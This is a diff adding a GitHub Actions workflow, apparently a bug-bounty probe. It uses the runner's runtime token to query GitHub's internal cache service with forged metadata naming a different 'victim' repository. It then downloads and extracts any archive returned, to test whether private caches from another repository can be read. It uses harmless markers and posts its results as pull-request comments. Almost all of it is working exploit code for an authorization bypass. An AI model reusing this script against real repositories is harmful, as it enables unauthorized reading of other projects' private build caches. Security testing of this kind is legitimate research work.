@@ -1,0 +1,315 @@
+name: GHBB public cache metadata boundary probe
+
+on:
+  issue_comment:
+    types: [created]
+
+permissions:
+  contents: read
+  issues: write
+  pull-requests: write
+
+jobs:
+  probe:
+    if: ${{ github.event.issue.pull_request && contains(github.event.comment.body, '/ghbb-public-cache-metadata') }}
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    env:
+      ATTACKER_REPOSITORY_ID: '1152881403'
+      ATTACKER_VERSION: 22d7b923d220ec226858997d7a5b6cdd3e5f2d2d5159c376b86ef921e50714fb
+      VICTIM_REPOSITORY_ID: '1313057222'
+      VICTIM_KEY: ghbb-xrepo-cache-20260726-7c4f-v2
+      VICTIM_VERSION: 4ebcb5f6ff2b3802f2a2b59322e39be80bfe0f33de47c5cf8e347bd801eb3652
+      VICTIM_MARKER: GHBB-VICTIM-20260726-7c4f
+    steps:
+      - name: Announce controlled public execution
+        uses: actions/github-script@v7
+        with:
+          script: |
+            await github.rest.issues.createComment({
+              owner: context.repo.owner,
+              repo: context.repo.repo,
+              issue_number: context.issue.number,
+              body: `<!-- ghbb-public-cache-start -->\nGHBB public Actions canary started for run ${context.runId}. No secrets or third-party data will be requested.`
+            })
+
+      - name: Create harmless attacker cache marker
+        shell: bash
+        run: |
+          set -euo pipefail
+          mkdir -p attacker-cache
+          printf 'GHBB-CACHE-METADATA-ATTACKER-%s\n' "$GITHUB_RUN_ID" > attacker-cache/marker.txt
+
+      - name: Save attacker positive-control cache
+        id: save
+        continue-on-error: true
+        uses: actions/cache/save@v4
+        with:
+          path: attacker-cache
+          key: ghbb-public-metadata-attacker-${{ github.run_id }}
+
+      - name: Test raw metadata authorization with exact archive verification
+        if: always()
+        uses: actions/github-script@v7
+        env:
+          SAVE_OUTCOME: ${{ steps.save.outcome }}
+          ATTACKER_KEY: ghbb-public-metadata-attacker-${{ github.run_id }}
+        with:
+          script: |
+            const fs = require('fs')
+            const path = require('path')
+            const crypto = require('crypto')
+            const {spawnSync} = require('child_process')
+
+            const token = process.env.ACTIONS_RUNTIME_TOKEN || ''
+            const resultsUrl = process.env.ACTIONS_RESULTS_URL || ''
+            const attackerKey = process.env.ATTACKER_KEY
+            const attackerRepositoryId = process.env.ATTACKER_REPOSITORY_ID
+            const attackerVersion = process.env.ATTACKER_VERSION
+            const attackerMarker = `GHBB-CACHE-METADATA-ATTACKER-${context.runId}`
+            const victimRepositoryId = process.env.VICTIM_REPOSITORY_ID
+            const victimKey = process.env.VICTIM_KEY
+            const victimVersion = process.env.VICTIM_VERSION
+            const victimMarker = process.env.VICTIM_MARKER
+
+            const state = {
+              save_outcome: process.env.SAVE_OUTCOME || '<unset>',
+              runtime_context_valid: Boolean(token && resultsUrl),
+              positive_baseline_valid: false,
+              positive_current_metadata_valid: false,
+              wrong_scope_missed: false,
+              metadata_parser_oracle: false,
+              harness_valid: false,
+              authorization_boundary_failure: false,
+              failure: '<none>'
+            }
+            const cases = []
+            const base = resultsUrl ? (resultsUrl.endsWith('/') ? resultsUrl : `${resultsUrl}/`) : ''
+            const service = `${base}twirp/github.actions.results.api.v1.CacheService`
+
+            async function lookup(body) {
+              try {
+                const response = await fetch(`${service}/GetCacheEntryDownloadURL`, {
+                  method: 'POST',
+                  headers: {
+                    authorization: `Bearer ${token}`,
+                    'content-type': 'application/json'
+                  },
+                  body: JSON.stringify(body),
+                  signal: AbortSignal.timeout(20000)
+                })
+                const text = await response.text()
+                let json = null
+                try { json = text ? JSON.parse(text) : {} } catch (_) {}
+                return {status: response.status, json}
+              } catch (_) {
+                return {status: 0, json: null}
+              }
+            }
+
+            async function download(url) {
+              if (!url) return {status: 0, bytes: Buffer.alloc(0)}
+              core.setSecret(url)
+              try {
+                const response = await fetch(url, {signal: AbortSignal.timeout(20000)})
+                const bytes = response.status === 200
+                  ? Buffer.from(await response.arrayBuffer())
+                  : Buffer.alloc(0)
+                return {status: response.status, bytes}
+              } catch (_) {
+                return {status: 0, bytes: Buffer.alloc(0)}
+              }
+            }
+
+            function extractArchive(label, bytes) {
+              const result = {archive_valid: false, extract_exit: -1, directory: ''}
+              if (!bytes.length) return result
+              const safe = label.replace(/[^a-zA-Z0-9_.-]/g, '_')
+              const archive = `${safe}.tzst`
+              const directory = `${safe}-extract`
+              fs.writeFileSync(archive, bytes, {mode: 0o600})
+              fs.rmSync(directory, {recursive: true, force: true})
+              fs.mkdirSync(directory, {recursive: true, mode: 0o700})
+
+              let extracted = spawnSync('tar', [
+                '--use-compress-program', 'unzstd',
+                '-xf', archive,
+                '-C', directory
+              ], {timeout: 20000, encoding: 'utf8'})
+
+              if (extracted.status !== 0) {
+                extracted = spawnSync('bash', ['-lc',
+                  `zstd -d -q --stdout ${archive} | tar -xf - -C ${directory}`
+                ], {timeout: 20000, encoding: 'utf8'})
+              }
+
+              result.extract_exit = extracted.status === null ? -1 : extracted.status
+              result.archive_valid = extracted.status === 0
+              result.directory = directory
+              return result
+            }
+
+            function findExactMarker(root, expected) {
+              if (!root || !fs.existsSync(root)) return false
+              const pending = [root]
+              let files = 0
+              while (pending.length && files < 1000) {
+                const current = pending.pop()
+                let entries = []
+                try { entries = fs.readdirSync(current, {withFileTypes: true}) } catch (_) { continue }
+                for (const entry of entries) {
+                  const full = path.join(current, entry.name)
+                  if (entry.isDirectory()) {
+                    pending.push(full)
+                  } else if (entry.isFile()) {
+                    files += 1
+                    try {
+                      const stat = fs.statSync(full)
+                      if (stat.size <= 1024 * 1024 && fs.readFileSync(full, 'utf8').trim() === expected) return true
+                    } catch (_) {}
+                  }
+                }
+              }
+              return false
+            }
+
+            async function runCase({name, key, version, metadata, expectedMarker}) {
+              const body = {key, restore_keys: [], version}
+              if (metadata !== undefined) body.metadata = metadata
+              const response = await lookup(body)
+              const url = response.json?.signed_download_url || response.json?.signedDownloadUrl || ''
+              const downloaded = await download(url)
+              const extracted = extractArchive(name, downloaded.bytes)
+              const exact = extracted.archive_valid && findExactMarker(extracted.directory, expectedMarker)
+              const record = {
+                name,
+                http: response.status,
+                ok: response.json?.ok === true,
+                signed_url: Boolean(url),
+                matched_key: response.json?.matched_key || response.json?.matchedKey || '<none>',
+                download_http: downloaded.status,
+                bytes: downloaded.bytes.length,
+                sha256: downloaded.bytes.length
+                  ? crypto.createHash('sha256').update(downloaded.bytes).digest('hex')
+                  : '<none>',
+                archive_valid: extracted.archive_valid,
+                extract_exit: extracted.extract_exit,
+                exact_marker: exact
+              }
+              cases.push(record)
+              return record
+            }
+
+            try {
+              if (!state.runtime_context_valid) throw new Error('runtime_context')
+
+              const baseline = await runCase({
+                name: 'positive_baseline',
+                key: attackerKey,
+                version: attackerVersion,
+                expectedMarker: attackerMarker
+              })
+              state.positive_baseline_valid = baseline.http === 200 && baseline.ok && baseline.signed_url &&
+                baseline.download_http === 200 && baseline.archive_valid && baseline.exact_marker
+
+              const currentMetadata = await runCase({
+                name: 'positive_current_metadata',
+                key: attackerKey,
+                version: attackerVersion,
+                metadata: {
+                  repository_id: attackerRepositoryId,
+                  scope: [{scope: 'refs/heads/main', permission: '1'}]
+                },
+                expectedMarker: attackerMarker
+              })
+              state.positive_current_metadata_valid = currentMetadata.http === 200 && currentMetadata.ok &&
+                currentMetadata.signed_url && currentMetadata.download_http === 200 &&
+                currentMetadata.archive_valid && currentMetadata.exact_marker
+
+              const wrongScope = await runCase({
+                name: 'positive_wrong_scope_oracle',
+                key: attackerKey,
+                version: attackerVersion,
+                metadata: {
+                  repository_id: attackerRepositoryId,
+                  scope: [{scope: 'refs/heads/ghbb-definitely-missing', permission: '1'}]
+                },
+                expectedMarker: attackerMarker
+              })
+              state.wrong_scope_missed = !wrongScope.exact_marker && !wrongScope.signed_url
+              state.metadata_parser_oracle = state.positive_current_metadata_valid && state.wrong_scope_missed
+              state.harness_valid = state.save_outcome === 'success' &&
+                state.positive_baseline_valid && state.positive_current_metadata_valid
+
+              const foreignCases = [
+                {
+                  name: 'victim_pr_read',
+                  metadata: {repository_id: victimRepositoryId, scope: [{scope: 'refs/pull/1/merge', permission: '1'}]}
+                },
+                {
+                  name: 'victim_pr_all',
+                  metadata: {repository_id: victimRepositoryId, scope: [{scope: 'refs/pull/1/merge', permission: '3'}]}
+                },
+                {
+                  name: 'victim_main_read',
+                  metadata: {repository_id: victimRepositoryId, scope: [{scope: 'refs/heads/main', permission: '1'}]}
+                },
+                {
+                  name: 'victim_main_all',
+                  metadata: {repository_id: victimRepositoryId, scope: [{scope: 'refs/heads/main', permission: '3'}]}
+                },
+                {
+                  name: 'victim_empty_scope',
+                  metadata: {repository_id: victimRepositoryId, scope: []}
+                },
+                {
+                  name: 'victim_attacker_scope',
+                  metadata: {repository_id: victimRepositoryId, scope: [{scope: 'refs/heads/main', permission: '3'}]}
+                },
+                {
+                  name: 'victim_camelcase_control',
+                  metadata: {repositoryId: victimRepositoryId, scope: [{scope: 'refs/pull/1/merge', permission: '3'}]}
+                }
+              ]
+
+              for (const item of foreignCases) {
+                const record = await runCase({
+                  name: item.name,
+                  key: victimKey,
+                  version: victimVersion,
+                  metadata: item.metadata,
+                  expectedMarker: victimMarker
+                })
+                if (record.exact_marker) state.authorization_boundary_failure = true
+              }
+            } catch (error) {
+              state.failure = String(error?.message || 'other').replace(/[^a-zA-Z0-9_.-]/g, '_').slice(0, 80)
+            }
+
+            for (const [name, value] of Object.entries(state)) console.log(`${name}=${value}`)
+            for (const item of cases) console.log(`${item.name}=${JSON.stringify(item)}`)
+
+            const caseLines = cases.map(item =>
+              `- ${item.name}: \`http=${item.http}, ok=${item.ok}, signed=${item.signed_url}, matched=${item.matched_key}, download=${item.download_http}, bytes=${item.bytes}, archive=${item.archive_valid}, extract=${item.extract_exit}, exact=${item.exact_marker}, sha256=${item.sha256}\``
+            )
+            const body = [
+              '<!-- ghbb-public-cache-metadata-result -->',
+              `GHBB public cache metadata authorization result for run ${context.runId}:`,
+              ...Object.entries(state).map(([name, value]) => `- ${name}: \`${value}\``),
+              ...caseLines,
+              '- runtime_token_signed_url_or_content_exposed: `false`'
+            ].join('\n')
+            await github.rest.issues.createComment({
+              owner: context.repo.owner,
+              repo: context.repo.repo,
+              issue_number: context.issue.number,
+              body
+            })
+
+            if (!state.harness_valid) {
+              core.setFailed(`Public cache metadata harness invalid: ${state.failure}`)
+            } else if (state.authorization_boundary_failure) {
+              core.setFailed('CONFIRMED_PRIVATE_CROSS_REPOSITORY_ACTIONS_CACHE_READ_VIA_CLIENT_METADATA')
+            } else {
+              console.log('RESULT=PUBLIC_TO_PRIVATE_CACHE_METADATA_OVERRIDE_DENIED_EXPECTED')
+            }
